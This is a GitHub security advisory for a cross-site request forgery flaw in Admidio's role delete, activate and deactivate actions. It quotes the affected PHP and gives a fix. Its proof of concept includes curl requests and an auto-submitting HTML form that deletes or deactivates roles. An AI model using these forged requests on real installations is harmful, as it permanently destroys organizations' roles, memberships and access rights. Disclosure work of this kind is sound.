# [M] Admidio is Missing CSRF Validation on Role Delete, Activate, and Deactivate Actions

## Summary
Severity: Medium
Advisory: GHSA-wwg8-6ffr-h4q2
CVE: CVE-2026-32816
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-wwg8-6ffr-h4q2
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=5.0.0 <5.0.7

## Details
## Summary

The `delete`, `activate`, and `deactivate` modes in `modules/groups-roles/groups_roles.php` perform destructive state changes on organizational roles but never validate an anti-CSRF token. The client-side UI passes a CSRF token to `callUrlHideElement()`, which includes it in the POST body, but the server-side handlers ignore `$_POST["adm_csrf_token"]` entirely for these three modes. An attacker who can discover a role UUID (visible in the public `cards` view when the module is publicly accessible) can embed a forged POST form on any external page and trick any user with the `rol_assign_roles` right into deleting or toggling roles for the organization. Role deletion is permanent and cascades to all memberships, event associations, and rights data.

## Details

### CSRF Token Is Sent but Never Validated

File: `D:/bugcrowd/admidio/repo/modules/groups-roles/groups_roles.php`, lines 150-173

The `save` mode (lines 143-148) is CSRF-protected via `RolesService::save()` which calls `getFormObject($_POST["adm_csrf_token"])->validate()`. The `delete`, `activate`, and `deactivate` modes receive no equivalent protection:

```php
case 'delete':
    // delete role from database
    $role = new Role($gDb);
    $role->readDataByUuid($getRoleUUID);
    if ($role->delete()) {
        echo json_encode(array('status' => 'success'));
    }
    break;

case 'activate':
    // set role active
    $role = new Role($gDb);
    $role->readDataByUuid($getRoleUUID);
    $role->activate();
    echo 'done';
    break;

case 'deactivate':
    // set role inactive
    $role = new Role($gDb);
    $role->readDataByUuid($getRoleUUID);
    $role->deactivate();
    echo 'done';
    break;
```

The only input validated is `$getRoleUUID` at line 41, checked as a `'uuid'` type. This prevents SQL injection but provides no CSRF protection.

### Client-Side UI Passes Token; Server Ignores It

File: `D:/bugcrowd/admidio/repo/system/js/common_functions.js`, lines 101-129

The presenter embeds the CSRF token into the JavaScript `callUrlHideElement()` call (GroupsRolesPresenter.php line 131). The function sends it in an AJAX POST body:

```javascript
function callUrlHideElement(elementId, url, csrfToken, callback) {
    $.post(url, {
        "adm_csrf_token": csrfToken,  // sent in POST body
        "uuid": elementId
    }, function(data) { ... });
}
```

The server-side handler reads `mode` from `$_GET` but never reads or validates `$_POST["adm_csrf_token"]` for `delete`, `activate`, or `deactivate`. An attacker omits the token field entirely; the server does not check for its presence.

### Who Can Be the CSRF Victim

File: `D:/bugcrowd/admidio/repo/modules/groups-roles/groups_roles.php`, lines 49-54

```php
if ($getMode !== 'cards') {
    // only users with the special right are allowed to manage roles
    if (!$gCurrentUser->isAdministratorRoles()) {
        throw new Exception('SYS_NO_RIGHTS');
    }
}
```

`isAdministratorRoles()` maps to `checkRolesRight('rol_assign_roles')`. This is a delegated organizational right, not full system administrator (`isAdministrator()`) access. Any member granted the right to manage roles -- for example, a volunteer coordinator or chapter secretary -- is a valid CSRF victim.

### Role UUIDs Are Discoverable Without Authentication

File: `D:/bugcrowd/admidio/repo/src/UI/Presenter/GroupsRolesPresenter.php`, line 84

```php
$templateRow['id'] = 'role_' . $role->getValue('rol_uuid');
```

The `cards` mode (the default view) does not require the `rol_assign_roles` right and is publicly reachable when the module is enabled. Role UUIDs appear as HTML element IDs and in action data attributes in the page source. An unauthenticated visitor can collect all role UUIDs before staging the CSRF attack against a logged-in victim.

### Role::delete() Is Permanent and Cascading

File: `D:/bugcrowd/admidio/repo/src/Roles/Entity/Role.php`, lines 264-288

```php
$this->db->startTransaction();

// Remove all role dependency relationships
$sql = 'DELETE FROM ' . TBL_ROLE_DEPENDENCIES . ' WHERE rld_rol_id_parent = ? OR rld_rol_id_child = ?';
$this->db->queryPrepared($sql, array($rolId, $rolId));

// Remove all memberships
$sql = 'DELETE FROM ' . TBL_MEMBERS . ' WHERE mem_rol_id = ?';
$this->db->queryPrepared($sql, array($rolId));

// Disassociate all events linked to this role
$sql = 'UPDATE ' . TBL_EVENTS . ' SET dat_rol_id = NULL WHERE dat_rol_id = ?';
$this->db->queryPrepared($sql, array($rolId));

// Remove all access-right entries for this role
$sql = 'DELETE FROM ' . TBL_ROLES_RIGHTS_DATA . ' WHERE rrd_rol_id = ?';
$this->db->queryPrepared($sql, array($rolId));
```

There is no soft-delete or recycle bin. Deletion permanently removes the role record, all memberships within it, all role dependency rules, and all per-module access rights granted to the role.

## PoC

The attacker hosts the following HTML page and tricks a user with the `rol_assign_roles` right into visiting it while logged in to Admidio.

**Step 1: Collect role UUIDs from the public cards view (no login required)**

```
curl "https://TARGET/adm_program/modules/groups-roles/groups_roles.php?mode=cards"
```

Role UUIDs appear in the HTML source as element IDs (`id="role_<UUID>"`) and in action data attributes.

**Step 2: Forge a deletion request (no CSRF token needed)**

```
curl -X POST \\
  "https://TARGET/adm_program/modules/groups-roles/groups_roles.php?mode=delete&role_uuid=ROLE_UUID" \\
  -H "Cookie: ADMIDIO_SESSION_ID=victim_session" \\
  -d ""
```

Expected response: `{"status":"success"}`

The role, all its memberships, all event associations, and all access-right entries are permanently deleted. No `adm_csrf_token` field is required.

**Step 3 (CSRF delivery -- attacker hosts externally)**

```html
<!DOCTYPE html>
<html>
<body onload="document.getElementById('f').submit()">
  <form id="f" method="POST"
        action="https://TARGET/adm_program/modules/groups-roles/groups_roles.php?mode=delete&role_uuid=ROLE_UUID">
    <!-- No adm_csrf_token field needed -->
  </form>
</body>
</html>
```

When any user with `rol_assign_roles` views this page while authenticated, the targeted role is permanently deleted without any confirmation from the victim.

**Step 4 (Deactivate via CSRF -- disables a role without deleting it)**

```html
<form id="f" method="POST"
      action="https://TARGET/adm_program/modules/groups-roles/groups_roles.php?mode=deactivate&role_uuid=ROLE_UUID">
</form>
```

Deactivating a role removes all active members from the role and hides it, effectively revoking access for all members without destroying the role record.

## Impact

- **Permanent Role Deletion:** A CSRF-triggered `delete` request irrecoverably removes the targeted role and all associated memberships, event links, and permission grants. There is no undo path other than a database restore.
- **Mass Membership Revocation:** Every member of the deleted role loses their membership record simultaneously. Role membership in Admidio controls access to events, document folders, mailing lists, and custom profile-field visibility.
- **Role State Manipulation:** An attacker can force `activate` or `deactivate` on any role. Deactivation silently strips access from an entire group without deleting the role record.
- **Low Attack Surface Requirement:** The attacker only needs to trick a user with the delegated `rol_assign_roles` right -- not a full system administrator. Such users are common in organizations that delegate group management to department heads or committee chairs.
- **UUID Pre-Collection Without Authentication:** Role UUIDs are harvested from the public cards view before the CSRF attack is staged, making target selection trivial.

## Recommended Fix

Add `SecurityUtils::validateCsrfToken($_POST["adm_csrf_token"])` at the beginning of each vulnerable case, consistent with how other mutative actions in the codebase are protected.

```php
// File: modules/groups-roles/groups_roles.php

case 'delete':
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
    $role = new Role($gDb);
    $role->readDataByUuid($getRoleUUID);
    if ($role->delete()) {
        echo json_encode(array('status' => 'success'));
    }
    break;

case 'activate':
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
    $role = new Role($gDb);
    $role->readDataByUuid($getRoleUUID);
    $role->activate();
    echo 'done';
    break;

case 'deactivate':
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
    $role = new Role($gDb);
    $role->readDataByUuid($getRoleUUID);
    $role->deactivate();
    echo 'done';
    break;
```

Since `callUrlHideElement` already sends `adm_csrf_token` in the POST body, adding the server-side validation call is a one-line fix per case and requires no changes to the front-end JavaScript or templates.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-wwg8-6ffr-h4q2
- https://nvd.nist.gov/vuln/detail/CVE-2026-32816
- https://github.com/Admidio/admidio
- https://github.com/Admidio/admidio/releases/tag/v5.0.7
